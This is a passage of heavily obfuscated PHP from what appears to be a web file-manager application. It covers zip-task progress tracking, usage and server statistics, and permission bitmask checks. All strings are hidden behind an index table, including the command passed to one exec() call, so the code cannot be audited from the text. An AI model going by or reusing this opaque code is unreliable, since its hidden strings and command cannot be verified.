$…ß§óâ) { $âó§¸Ïé =& $_SERVER[„½Ù‘ß¨]; return call_user_func(array($âó§¸Ïé[308], $âó§¸Ïé[310]), $¤ÏòÎ¹ø, $…ß§óâ); } } goto CöÛê¿“; Dá‡İïÖö†: class TaskZip extends TaskFileTransfer { protected function startAfter() { $·åˆÈ¢· =& $_SERVER[Õò”†—·]; parent::startAfter(); Hook::bind($·åˆÈ¢·[1879], array($this, $·åˆÈ¢·[1869])); Hook::bind($·åˆÈ¢·[1871], array($this, $·åˆÈ¢·[1872])); $¸îÜßññ =& $this->task; $¸îÜßññ[$·åˆÈ¢·[1873]] = $·åˆÈ¢·[1248]; if (!$¸îÜßññ[$·åˆÈ¢·[1643]]) { $¸îÜßññ[$·åˆÈ¢·[1643]] = LNG($·åˆÈ¢·[1880]); } } protected function endAfter() { $¬›¸ÌÀÖ =& $_SERVER[Õò”†—·]; parent::endAfter(); Hook::unbind($¬›¸ÌÀÖ[1879], array($this, $¬›¸ÌÀÖ[1869])); Hook::unbind($¬›¸ÌÀÖ[1871], array($this, $¬›¸ÌÀÖ[1872])); } public function updateAfter() { $æÚ‰“Üü =& $_SERVER[Õò”†—·]; $Ò£§ÑËŒ =& $this->task; if (!$Ò£§ÑËŒ[$æÚ‰“Üü[1113]] || !$Ò£§ÑËŒ[$æÚ‰“Üü[814]]) { return; } if ($Ò£§ÑËŒ[$æÚ‰“Üü[1873]] == $æÚ‰“Üü[1248]) { $ğÇİšıŞ = $Ò£§ÑËŒ[$æÚ‰“Üü[1809]]; if ($Ò£§ÑËŒ[$æÚ‰“Üü[1810]] != $æÚ‰“Üü[1248]) { $ğÇİšıŞ = 0; } $·®¯ï‹ = ($Ò£§ÑËŒ[$æÚ‰“Üü[1813]] + $ğÇİšıŞ) / $Ò£§ÑËŒ[$æÚ‰“Üü[814]]; $Ò£§ÑËŒ[$æÚ‰“Üü[1757]] = $·®¯ï‹ * 0.3; } else { if ($Ò£§ÑËŒ[$æÚ‰“Üü[1873]] == $æÚ‰“Üü[373]) { $·®¯ï‹ = $Ò£§ÑËŒ[$æÚ‰“Üü[1756]] / $Ò£§ÑËŒ[$æÚ‰“Üü[1113]]; $Ò£§ÑËŒ[$æÚ‰“Üü[1757]] = 0.3 + $·®¯ï‹ * 0.5; } else { if ($Ò£§ÑËŒ[$æÚ‰“Üü[1873]] == $æÚ‰“Üü[120]) { $·®¯ï‹ = 0; if ($Ò£§ÑËŒ[$æÚ‰“Üü[1808]]) { $·®¯ï‹ = $Ò£§ÑËŒ[$æÚ‰“Üü[1809]] / $Ò£§ÑËŒ[$æÚ‰“Üü[1808]]; } $Ò£§ÑËŒ[$æÚ‰“Üü[1757]] = 0.3 + 0.5 + $·®¯ï‹ * 0.2; } } } if ($Ò£§ÑËŒ[$æÚ‰“Üü[1757]] > 0) { $ä¢›šÔ© = timeFloat() - $Ò£§ÑËŒ[$æÚ‰“Üü[1759]] - $Ò£§ÑËŒ[$æÚ‰“Üü[1762]]; $Ò£§ÑËŒ[$æÚ‰“Üü[1763]] = $ä¢›šÔ© * (1 - $Ò£§ÑËŒ[$æÚ‰“Üü[1757]]) / $Ò£§ÑËŒ[$æÚ‰“Üü[1757]]; } } public function copyFileStart($°ñÇ¹³×, $©˜œõÏ, $îë‘‘é½, $Ôâ‹¡Ìœ, $Å§œ±¼, $²ğÇ›Èø) { $Ä¿˜í›¢ =& $_SERVER[Õò”†—·]; parent::copyFileStart($°ñÇ¹³×, $©˜œõÏ, $îë‘‘é½, $Ôâ‹¡Ìœ, $Å§œ±¼, $²ğÇ›Èø); $È£ù Ë =& $this->task; if ($È£ù Ë[$Ä¿˜í›¢[1873]] == $Ä¿˜í›¢[373]) { $È£ù Ë[$Ä¿˜í›¢[1873]] = $Ä¿˜í›¢[120]; } $this->update(); } public function copyFileEnd($Şèçà §, $Ğ²øèà, $çß©·ò, $’Š‚¿®€, $€ØÍ¬ß, $Ïô‚û„¡) { $ëšÉŸÀ =& $_SERVER[Õò”†—·]; $¥­ƒñéÙ =& $this->task; $¥­ƒñéÙ[$ëšÉŸÀ[1809]] = $¥­ƒñéÙ[$ëšÉŸÀ[1808]]; $¥­ƒñéÙ[$ëšÉŸÀ[1813]] += $¥­ƒñéÙ[$ëšÉŸÀ[1808]]; $¥­ƒñéÙ[$ëšÉŸÀ[1810]] = $ëšÉŸÀ[22]; $this->update(); } public function zipEvent($ Ÿ¿ğšë, $Š°ÜÉ½Ë, $¡úòÀ , $ßÍ—•Å) { $¨¡ò‹¢ =& $_SERVER[Õò”†—·]; $ßşãõ½ =& $this->task; $ßşãõ½[$¨¡ò‹¢[1806]] = get_path_this($Š°ÜÉ½Ë); $ßşãõ½[$¨¡ò‹¢[1808]] = $ßÍ—•Å; $ßşãõ½[$¨¡ò‹¢[1809]] = $¡úòÀ ; $ßşãõ½[$¨¡ò‹¢[1115]] = $ Ÿ¿ğšë == $¨¡ò‹¢[1881] ? $¨¡ò‹¢[1876] : $¨¡ò‹¢[1877]; $ßşãõ½[$¨¡ò‹¢[1810]] = $¨¡ò‹¢[22]; $ßşãõ½[$¨¡ò‹¢[814]] = $ßÍ—•Å; $ßşãõ½[$¨¡ò‹¢[1873]] = $¨¡ò‹¢[373]; $this->update(); } public function nameParse($ò¸‹§Ä¿) { $÷ìÍ²¯› =& $_SERVER[Õò”†—·]; $Û©Ë»¯µ =& $this->task; if ($Û©Ë»¯µ[$÷ìÍ²¯›[1756]] < $Û©Ë»¯µ[$÷ìÍ²¯›[1113]]) { $Ô“¬†ğ½ = get_path_this($ò¸‹§Ä¿); if (strstr($Ô“¬†ğ½, $÷ìÍ²¯›[20])) { $Û©Ë»¯µ[$÷ìÍ²¯›[1756]] += 1; } } if ($Û©Ë»¯µ[$÷ìÍ²¯›[1873]] == $÷ìÍ²¯›[1248]) { $Û©Ë»¯µ[$÷ìÍ²¯›[1873]] = $÷ìÍ²¯›[373]; } $Û©Ë»¯µ[$÷ìÍ²¯›[1806]] = $ò¸‹§Ä¿; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÏßûÒÙû) { $šÅòÜşØ =& $_SERVER[Õò”†—·]; $İÙÅÏç¾ = array($šÅòÜşØ[646] => array($šÅòÜşØ[43] => $šÅòÜşØ[1882], $šÅòÜşØ[334] => array($šÅòÜşØ[256], $šÅòÜşØ[816], $šÅòÜşØ[1883], $šÅòÜşØ[1884])), $šÅòÜşØ[1885] => array($šÅòÜşØ[43] => $šÅòÜşØ[1886], $šÅòÜşØ[334] => array($šÅòÜşØ[256], $šÅòÜşØ[814], $šÅòÜşØ[1887], $šÅòÜşØ[1888], $šÅòÜşØ[1889]))); if (!isset($İÙÅÏç¾[$ÏßûÒÙû])) { return !1; } $this->optionType = $İÙÅÏç¾[$ÏßûÒÙû][$šÅòÜşØ[43]]; $this->field = $İÙÅÏç¾[$ÏßûÒÙû][$šÅòÜşØ[334]]; return !0; } public function listData($î¼é»Åü = false, $Í¹»Åï¬ = "\155\x6f\x64\x69\x66\171\x54\151\155\x65", $Ò¶†¶ƒÎ = false) { return parent::listData($î¼é»Åü, $Í¹»Åï¬, $Ò¶†¶ƒÎ); } public function trendList($•Û£ñÍŒ) { $°†ÍÔ¡³ =& $_SERVER[Õò”†—·]; $Ãü”‹©Ê = $this->listData(); if ($Ãü”‹©Ê) { $©º´÷› = end($Ãü”‹©Ê); $²“¨•øË = date($°†ÍÔ¡³[1890], strtotime($°†ÍÔ¡³[1891])); if ($©º´÷›[$°†ÍÔ¡³[256]] == $²“¨•øË) { return $Ãü”‹©Ê; } $Í³ÈÀÚè = strtotime($©º´÷›[$°†ÍÔ¡³[256]]); } if (!isset($Í³ÈÀÚè)) { $ÃÜš½‘Î = $•Û£ñÍŒ == $°†ÍÔ¡³[646] ? $°†ÍÔ¡³[583] : $°†ÍÔ¡³[875]; $Í³ÈÀÚè = Model($ÃÜš½‘Î)->min($°†ÍÔ¡³[232]); } $öøä¡û = $°†ÍÔ¡³[1892] . ucfirst($•Û£ñÍŒ); $¼“Úõö› = $this->dateList($Í³ÈÀÚè); foreach ($¼“Úõö› as $²“¨•øË) { $this->{$öøä¡û}($²“¨•øË); } return $this->listData(); } private function dateList($­’ÀÅ¯Ç) { $§À›ã•å =& $_SERVER[Õò”†—·]; $öëï¥¯Ü = $­’ÀÅ¯Ç; $éæÖ‘‚³ = strtotime($§À›ã•å[1891]); $ãã‘üöÊ = array(); while ($öëï¥¯Ü <= $éæÖ‘‚³) { $ãã‘üöÊ[] = date($§À›ã•å[1890], $öëï¥¯Ü); $öëï¥¯Ü = strtotime($§À›ã•å[1893], $öëï¥¯Ü); } return $ãã‘üöÊ; } public function _recordUser($ÀßåŒÚä = '') { $±•şµµ =& $_SERVER[Õò”†—·]; $öü‰õãÅ = strtotime(date($±•şµµ[1894], strtotime($ÀßåŒÚä))); $Í·—¿³› = strtotime(date($±•şµµ[1895], strtotime($ÀßåŒÚä))); $•â««éã = array($±•şµµ[232] => array($±•şµµ[1063], $Í·—¿³›)); $¡¶¢ó = Model($±•şµµ[583])->where($•â««éã)->count($±•şµµ[1755]); $•â««éã[$±•şµµ[232]] = array($±•şµµ[393], array($öü‰õãÅ, $Í·—¿³›)); $ğåøéçÃ = Model($±•şµµ[583])->where($•â««éã)->count($±•şµµ[1755]); $•â««éã[$±•şµµ[43]] = $±•şµµ[1896]; $ ¨‹´ôâ = Model($±•şµµ[1897])->where($•â««éã)->count($±•şµµ[1898]); $ŒôÅ‚®÷ = array($±•şµµ[256] => $ÀßåŒÚä, $±•şµµ[816] => (int) $¡¶¢ó, $±•şµµ[1883] => (int) $ğåøéçÃ, $±•şµµ[1884] => (int) $ ¨‹´ôâ); return $this->insert($ŒôÅ‚®÷); } public function _recordStore($¦ëÀ…æÜ = '') { $úÖê¦î¹ =& $_SERVER[Õò”†—·]; $„»Ä„Ãª = strtotime(date($úÖê¦î¹[1895], strtotime($¦ëÀ…æÜ))); $¡òÜ£˜ = array($úÖê¦î¹[232] => array($úÖê¦î¹[1063], $„»Ä„Ãª)); $¤†ú±ä = Model($úÖê¦î¹[528])->where($¡òÜ£˜)->sum($úÖê¦î¹[89]); $¡òÜ£˜[$úÖê¦î¹[469]] = 0; $‰Ö© = Model($úÖê¦î¹[875])->where($¡òÜ£˜)->sum($úÖê¦î¹[89]); $¡òÜ£˜[$úÖê¦î¹[191]] = 1; $—£Ñã = Model($úÖê¦î¹[875])->where($¡òÜ£˜)->sum($úÖê¦î¹[89]); $¡òÜ£˜[$úÖê¦î¹[191]] = 2; $Ø°ªæ± = Model($úÖê¦î¹[875])->where($¡òÜ£˜)->sum($úÖê¦î¹[89]); $Šä‡Ö…ß = array($úÖê¦î¹[256] => $¦ëÀ…æÜ, $úÖê¦î¹[814] => (int) $‰Ö©, $úÖê¦î¹[1887] => (int) $¤†ú±ä, $úÖê¦î¹[1888] => (int) $—£Ñã, $úÖê¦î¹[1889] => (int) $Ø°ªæ±); return $this->insert($Šä‡Ö…ß); } public function trend($‘æÈÔ‹š, $ÜôêÏ¡) { $ñîˆÊ¿ =& $_SERVER[Õò”†—·]; if (!$this->init($‘æÈÔ‹š)) { return !1; } $«î ¦Û¨ = $this->trendList($‘æÈÔ‹š); if ($«î ¦Û¨ && $ÜôêÏ¡ != $ñîˆÊ¿[1728]) { $úµ¨“½ô = $«î ¦Û¨[0][$ñîˆÊ¿[256]]; $•ô§©ŒÌ = $this->validDate($ÜôêÏ¡, $úµ¨“½ô); $­›‚ß = array(); $ğ±‡«ùŠ = array_to_keyvalue($«î ¦Û¨, $ñîˆÊ¿[256]); foreach ($•ô§©ŒÌ as $ŒÆ™ÄšÀ) { if (isset($ğ±‡«ùŠ[$ŒÆ™ÄšÀ])) { $ïòé = $ğ±‡«ùŠ[$ŒÆ™ÄšÀ]; } else { $ïòé = end($«î ¦Û¨); $ïòé[$ñîˆÊ¿[256]] = $ŒÆ™ÄšÀ; if ($‘æÈÔ‹š == $ñîˆÊ¿[646]) { $ïòé[$ñîˆÊ¿[1883]] = $ïòé[$ñîˆÊ¿[1884]] = 0; } } $­›‚ß[] = $ïòé; } $«î ¦Û¨ = $­›‚ß; } $Ú›øüØÊ = array($ñîˆÊ¿[646] => array($ñîˆÊ¿[816] => LNG($ñîˆÊ¿[1899]), $ñîˆÊ¿[1883] => LNG($ñîˆÊ¿[1900]), $ñîˆÊ¿[1884] => LNG($ñîˆÊ¿[1901])), $ñîˆÊ¿[1885] => array($ñîˆÊ¿[814] => LNG($ñîˆÊ¿[1902]), $ñîˆÊ¿[1887] => LNG($ñîˆÊ¿[1903]), $ñîˆÊ¿[1888] => LNG($ñîˆÊ¿[1904]), $ñîˆÊ¿[1889] => LNG($ñîˆÊ¿[1905]))); $àášÏÖ = array($ñîˆÊ¿[646] => $ñîˆÊ¿[1906], $ñîˆÊ¿[1885] => $ñîˆÊ¿[89]); if (empty($«î ¦Û¨)) { $ŒÆ™ÄšÀ = date($ñîˆÊ¿[1890], strtotime($ñîˆÊ¿[1891])); $Ñ°¨Â… = array($ñîˆÊ¿[256] => $ŒÆ™ÄšÀ); foreach ($Ú›øüØÊ[$‘æÈÔ‹š] as $±ğ°ƒâø => $¨³ßÔé) { $Ñ°¨Â…[$±ğ°ƒâø] = 0; } $«î ¦Û¨[] = $Ñ°¨Â…; } $ºèÄäƒÀ = array(); foreach ($«î ¦Û¨ as $¨³ßÔé) { if ($‘æÈÔ‹š == $ñîˆÊ¿[1885] && $¨³ßÔé[$ñîˆÊ¿[1887]] > $¨³ßÔé[$ñîˆÊ¿[814]]) { $¨³ßÔé[$ñîˆÊ¿[1887]] = $¨³ßÔé[$ñîˆÊ¿[814]]; } foreach ($Ú›øüØÊ[$‘æÈÔ‹š] as $±ğ°ƒâø => $¡¹‚šÓĞ) { $ïòé = array($ñîˆÊ¿[256] => $¨³ßÔé[$ñîˆÊ¿[256]], $ñîˆÊ¿[1643] => $¡¹‚šÓĞ); $ïòé[$àášÏÖ[$‘æÈÔ‹š]] = isset($¨³ßÔé[$±ğ°ƒâø]) ? $¨³ßÔé[$±ğ°ƒâø] : 0; $ºèÄäƒÀ[] = $ïòé; } } return $ºèÄäƒÀ; } public function validDate($ôìúÛÏ, $‘Ÿñíç) { $¿±èÓñß =& $_SERVER[Õò”†—·]; $«ì¬ı¶ = date($¿±èÓñß[1890], strtotime($¿±èÓñß[1891])); $ó†º§Š = array($«ì¬ı¶); switch ($ôìúÛÏ) { case $¿±èÓñß[1735]: $ü·‡ƒ… = mktime(0, 0, 0, date($¿±èÓñß[1907]), date($¿±èÓñß[1420]) - date($¿±èÓñß[1514]) + 7 - 7, date($¿±èÓñß[1908])); $“÷€ë = 0; do { $ßÓÚ’ÎÍ = date($¿±èÓñß[1890], $ü·‡ƒ… - 3600 * 24 * 7 * $“÷€ë); $ó†º§Š[] = $ßÓÚ’ÎÍ; $“÷€ë++; } while ($‘Ÿñíç < $ßÓÚ’ÎÍ); break; case $¿±èÓñß[1733]: $“÷€ë = 1; do { $ãÀ„ = date($¿±èÓñß[1909], strtotime("\x2d\x20{$“÷€ë}\40\155\x6f\156\164\x68\x73")); $ó†º§Š[] = $ãÀ„; $“÷€ë++; } while ($‘Ÿñíç < $ãÀ„); break; case $¿±èÓñß[1910]: $àÆ«®…ì = (int) date($¿±èÓñß[1908], strtotime($‘Ÿñíç)); $²ôçß« = (int) date($¿±èÓñß[1908]); if ($àÆ«®…ì >= $²ôçß«) { break; } for ($àÆ«®…ì; $àÆ«®…ì < $²ôçß«; $àÆ«®…ì++) { $ó†º§Š[] = $àÆ«®…ì . $¿±èÓñß[1911]; } break; default: break; } if ($‘Ÿñíç > end($ó†º§Š)) { array_pop($ó†º§Š); } sort($ó†º§Š); return $ó†º§Š; } public function listTable($¿À‚‡£ø) { $êôûÚ¦× = ucfirst($¿À‚‡£ø); return Model($êôûÚ¦×)->listData(); } public function option($Â´™Ìş²) { $Ï¶şì¤± = $_SERVER[Õò”†—·][1912] . ucfirst($Â´™Ìş²); return $this->{$Ï¶şì¤±}(); } private function optionUser() { $ñ³´£€¶ =& $_SERVER[Õò”†—·]; $­¤¤Ş¼¥ = Model($ñ³´£€¶[583])->count($ñ³´£€¶[1755]); $¿ªñŒÌ¶ = Model($ñ³´£€¶[583])->where($ñ³´£€¶[1913])->count($ñ³´£€¶[1755]); $ªğÓ€µç = intval($GLOBALS[$ñ³´£€¶[16]][$ñ³´£€¶[409]][$ñ³´£€¶[1701]]) / 3600; $÷£Ôıå· = strtotime("\x2d{$ªğÓ€µç}\x20\150\157\165\162\163"); $™¬é’Á = strtotime(date($ñ³´£€¶[1894])); if ($÷£Ôıå· < $™¬é’Á) { $÷£Ôıå· = $™¬é’Á; } $¿šòã˜³ = array($ñ³´£€¶[1914] => array($ñ³´£€¶[1064], $÷£Ôıå·)); $±ÊâÍ¡ = (int) Model($ñ³´£€¶[583])->where($¿šòã˜³)->count($ñ³´£€¶[1755]); if (!$±ÊâÍ¡) { $±ÊâÍ¡ = 1; } $¿šòã˜³ = array($ñ³´£€¶[1914] => array($ñ³´£€¶[1064], $™¬é’Á)); $œÚ£È¤ = Model($ñ³´£€¶[583])->where($¿šòã˜³)->count($ñ³´£€¶[1755]); return array($ñ³´£€¶[809] => (int) $­¤¤Ş¼¥, $ñ³´£€¶[1915] => (int) ($­¤¤Ş¼¥ - $¿ªñŒÌ¶), $ñ³´£€¶[1916] => (int) $¿ªñŒÌ¶, $ñ³´£€¶[1917] => (int) $œÚ£È¤, $ñ³´£€¶[1918] => $±ÊâÍ¡); } private function optionFile() { $‹¥«òï‘ =& $_SERVER[Õò”†—·]; $şîæŞ•ú = $this->sourceSize(); $Ç—»İäÀ = $şîæŞ•ú[$‹¥«òï‘[89]]; $°ô€±õ = $şîæŞ•ú[$‹¥«òï‘[1887]]; $†—óÍ‰ô = Model($‹¥«òï‘[875])->where(array($‹¥«òï‘[469] => 0))->count($‹¥«òï‘[194]); $Œ¤é¨¦© = array($‹¥«òï‘[469] => 0, $‹¥«òï‘[232] => array($‹¥«òï‘[1064], strtotime(date($‹¥«òï‘[1894])))); $ÉŒØºÔ£ = Model($‹¥«òï‘[875])->where($Œ¤é¨¦©)->sum($‹¥«òï‘[89]); $³ñ¬ôÊá = Model($‹¥«òï‘[875])->where($Œ¤é¨¦©)->count($‹¥«òï‘[194]); return array($‹¥«òï‘[814] => $Ç—»İäÀ, $‹¥«òï‘[1887] => $°ô€±õ, $‹¥«òï‘[1919] => $Ç—»İäÀ - $°ô€±õ, $‹¥«òï‘[1920] => (int) $ÉŒØºÔ£, $‹¥«òï‘[816] => (int) $†—óÍ‰ô, $‹¥«òï‘[1921] => (int) $³ñ¬ôÊá); } private function optionAccess() { $À€Ëœ´• =& $_SERVER[Õò”†—·]; return array($À€Ëœ´•[809] => $this->typeLogCnt(), $À€Ëœ´•[120] => $this->typeLogCnt($À€Ëœ´•[120]), $À€Ëœ´•[509] => $this->typeLogCnt($À€Ëœ´•[509]), $À€Ëœ´•[1922] => $this->typeLogCnt($À€Ëœ´•[1922]), $À€Ëœ´•[1923] => $this->typeLogCnt($À€Ëœ´•[1923]), $À€Ëœ´•[646] => $this->typeLogCnt($À€Ëœ´•[22], $À€Ëœ´•[1898])); } private function typeLogCnt($€ğË¥ú = '', $¬†™íñì = "\151\x64") { $©Úœò¹ =& $_SERVER[Õò”†—·]; $ßŒÂ¬°» = array($©Úœò¹[120] => array($©Úœò¹[1924], $©Úœò¹[1925]), $©Úœò¹[509] => array($©Úœò¹[1926], $©Úœò¹[1927]), $©Úœò¹[1922] => array($©Úœò¹[1928], $©Úœò¹[1929], $©Úœò¹[1930]), $©Úœò¹[1923] => array($©Úœò¹[1931], $©Úœò¹[1932]), $©Úœò¹[1933] => array($©Úœò¹[1934], $©Úœò¹[1935], $©Úœò¹[1936])); $¤ãöˆè = strtotime(date($©Úœò¹[1894])); $­Şòœæ¡ = array($©Úœò¹[232] => array($©Úœò¹[1064], $¤ãöˆè)); if ($€ğË¥ú) { $­Şòœæ¡[$©Úœò¹[43]] = array($©Úœò¹[17], $ßŒÂ¬°»[$€ğË¥ú]); } $ˆáü˜£¬ = Model($©Úœò¹[1897])->where($­Şòœæ¡)->count($¬†™íñì); return (int) $ˆáü˜£¬; } private function optionServer() { $¼º·ø¼ =& $_SERVER[Õò”†—·]; $¶½Üè»Ò = $this->diskDriver(); $Çô¼ïÔ› = KodIO::defaultDriver(); $Ù¿‚œ› = array($¼º·ø¼[867] => $Çô¼ïÔ›[$¼º·ø¼[459]]); $›Ù¿ºÕà = Model($¼º·ø¼[528])->where($Ù¿‚œ›)->sum($¼º·ø¼[89]); $ŠÜ¥©§ø = explode($¼º·ø¼[63], $_SERVER[$¼º·ø¼[157]]); $ª’Â·°Ğ = $ŠÜ¥©§ø[0]; $äêÌôå» = $GLOBALS[$¼º·ø¼[16]][$¼º·ø¼[31]]; $›³¤ûÇÌ = $äêÌôå»[$¼º·ø¼[1026]]; if ($›³¤ûÇÌ == $¼º·ø¼[1014]) { $¬ÆŒõ­Ù = explode($¼º·ø¼[1336], $äêÌôå»[$¼º·ø¼[1025]]); $›³¤ûÇÌ = $¬ÆŒõ­Ù[0]; } if ($›³¤ûÇÌ == $¼º·ø¼[962] || $›³¤ûÇÌ == $¼º·ø¼[854]) { $›‡Á¥‚Ã = Model()->db()->query($¼º·ø¼[1937]); $‚»­Çùá = $›‡Á¥‚Ã[0] && isset($›‡Á¥‚Ã[0][$¼º·ø¼[1642]]) ? $›‡Á¥‚Ã[0][$¼º·ø¼[1642]] : 0; $›³¤ûÇÌ = $¼º·ø¼[1938] . ($‚»­Çùá ? $¼º·ø¼[18] . $‚»­Çùá : $¼º·ø¼[22]); } $òÁÉ•ĞÛ = $GLOBALS[$¼º·ø¼[16]][$¼º·ø¼[409]][$¼º·ø¼[877]]; return array($¼º·ø¼[1939] => $¶½Üè»Ò ? $¶½Üè»Ò[$¼º·ø¼[1940]] : 0, $¼º·ø¼[1941] => $¶½Üè»Ò ? $¶½Üè»Ò[$¼º·ø¼[1942]] : 0, $¼º·ø¼[1943] => (int) $Çô¼ïÔ›[$¼º·ø¼[1940]] * 1024 * 1024 * 1024, $¼º·ø¼[1944] => (int) $›Ù¿ºÕà, $¼º·ø¼[1945] => ucfirst($ª’Â·°Ğ), $¼º·ø¼[1946] => $¼º·ø¼[1947] . PHP_VERSION, $¼º·ø¼[1948] => phpBuild64() ? 64 : 32, $¼º·ø¼[808] => str_replace($¼º·ø¼[1183], $¼º·ø¼[1042], $›³¤ûÇÌ), $¼º·ø¼[409] => ucfirst($òÁÉ•ĞÛ), $¼º·ø¼[42] => $_SERVER[$¼º·ø¼[1949]]); } private function diskDriver() { $¸ãøÜ«  =& $_SERVER[Õò”†—·]; $ØÛ÷§Çô = $¸ãøÜ« [18]; $ô»ûÛŞ¹ = $GLOBALS[$¸ãøÜ« [16]][$¸ãøÜ« [1353]] == $¸ãøÜ« [1354]; if ($ô»ûÛŞ¹) { $ØÛ÷§Çô = $¸ãøÜ« [1950]; if (function_exists($¸ãøÜ« [1951])) { exec($¸ãøÜ« [1952], $óùÜªŠ¾); $ØÛ÷§Çô = $óùÜªŠ¾[1] . $¸ãøÜ« [18]; } } if (!file_exists($ØÛ÷§Çô)) { return; } $çÜŸÙá = @disk_total_space($ØÛ÷§Çô); $¢ŞØˆíƒ = $çÜŸÙá - @disk_free_space($ØÛ÷§Çô); return array($¸ãøÜ« [1940] => $çÜŸÙá, $¸ãøÜ« [1942] => $¢ŞØˆíƒ); } public function fileChart($ÚÒÆòîå) { $š¨óÍƒ =& $_SERVER[Õò”†—·]; if (isset($ÚÒÆòîå[$š¨óÍƒ[1755]])) { return Model($š¨óÍƒ[875])->userFileTypeProfile($ÚÒÆòîå[$š¨óÍƒ[1755]]); } if (isset($ÚÒÆòîå[$š¨óÍƒ[1953]])) { return Model($š¨óÍƒ[875])->groupFileTypeProfile($ÚÒÆòîå[$š¨óÍƒ[1953]]); } $ÕÏ‚ÑÛ² = $this->sourceSize(); $¨ Òü“ = array($š¨óÍƒ[193] => 0, $š¨óÍƒ[191] => 1); $¿ßì²Æ” = Model($š¨óÍƒ[875])->where($¨ Òü“)->sum($š¨óÍƒ[89]); $¨ Òü“[$š¨óÍƒ[191]] = 2; $†í’ÔÁ˜ = Model($š¨óÍƒ[875])->where($¨ Òü“)->sum($š¨óÍƒ[89]); return array($š¨óÍƒ[814] => $ÕÏ‚ÑÛ²[$š¨óÍƒ[89]], $š¨óÍƒ[1887] => $ÕÏ‚ÑÛ²[$š¨óÍƒ[1887]], $š¨óÍƒ[1888] => (int) $¿ßì²Æ”, $š¨óÍƒ[1889] => (int) $†í’ÔÁ˜); } private function sourceSize() { $…‰úÄÉ— =& $_SERVER[Õò”†—·]; $šî‚óô‹ = Model($…‰úÄÉ—[875])->where(array($…‰úÄÉ—[469] => 0))->sum($…‰úÄÉ—[89]); $‚íÜÑó = Model($…‰úÄÉ—[528])->sum($…‰úÄÉ—[89]); if ($‚íÜÑó > $šî‚óô‹) { $‚íÜÑó = $šî‚óô‹; } return array($…‰úÄÉ—[89] => (int) $šî‚óô‹, $…‰úÄÉ—[1887] => (int) $‚íÜÑó); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $˜òË±œ =& $_SERVER[Õò”†—·]; $–çÚî¼Á = array(array($˜òË±œ[478] => LNG($˜òË±œ[1954]), $˜òË±œ[1955] => $˜òË±œ[1956], $˜òË±œ[1957] => 1, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜òË±œ[478] => LNG($˜òË±œ[1960]), $˜òË±œ[1955] => $˜òË±œ[1961], $˜òË±œ[1957] => 2, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜òË±œ[478] => LNG($˜òË±œ[1962]), $˜òË±œ[1955] => $˜òË±œ[1963], $˜òË±œ[1957] => 3, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($˜òË±œ[478] => LNG($˜òË±œ[1964]), $˜òË±œ[1955] => $˜òË±œ[1965], $˜òË±œ[1957] => 4, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_VIEW), array($˜òË±œ[478] => LNG($˜òË±œ[1966]), $˜òË±œ[1955] => $˜òË±œ[1967], $˜òË±œ[1957] => 5, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($˜òË±œ[478] => LNG($˜òË±œ[1968]), $˜òË±œ[1955] => $˜òË±œ[1969], $˜òË±œ[1957] => 6, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($˜òË±œ[478] => LNG($˜òË±œ[1970]), $˜òË±œ[1955] => $˜òË±œ[1971], $˜òË±œ[1957] => 7, $˜òË±œ[1958] => 1, $˜òË±œ[1959] => 0)); return $–çÚî¼Á; } public static function authCheck($¢ÄÉš¸ò, $ÒßŸØè¶) { $™åÑ§šÚ =& $_SERVER[Õò”†—·]; $¢ÄÉš¸ò = intval($¢ÄÉš¸ò); if (KodUser::isRoot() && $GLOBALS[$™åÑ§šÚ[16]][$™åÑ§šÚ[1972]]) { return !0; } if ($¢ÄÉš¸ò <= 0) { return !1; } if (($¢ÄÉš¸ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¢ÄÉš¸ò & $ÒßŸØè¶); } public static function authCheckShow($ĞÉÔĞà©) { return self::authCheck($ĞÉÔĞà©, self::AUTH_SHOW); } public static function authCheckView($¨¼”¬—á) { return self::authCheck($¨¼”¬—á, self::AUTH_VIEW); } public static function authCheckDownload($ÑôŞˆ–) { return self::authCheck($ÑôŞˆ–, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ü€íîÊª) { return self::authCheck($ü€íîÊª, self::AUTH_UPLOAD); } public static function authCheckEdit($è£¾¬Š) { return self::authCheck($è£¾¬Š, self::AUTH_EDIT); } public static function authCheckRemove($„êÒüñ) { return self::authCheck($„êÒüñ, self::AUTH_REMOVE); } public static function authCheckShare($è‘äŸƒ) { return self::authCheck($è‘äŸƒ, self::AUTH_SHARE); } public static function authCheckComment($Áôø§›â) { return self::authCheck($Áôø§›â, self::AUTH_COMMENT); } public static function authCheckEvent($…Æ‚óÔ­) { return self::authCheck($…Æ‚óÔ­, self::AUTH_EVENT); } public static function authCheckRoot($•¢ùÖ—) { return 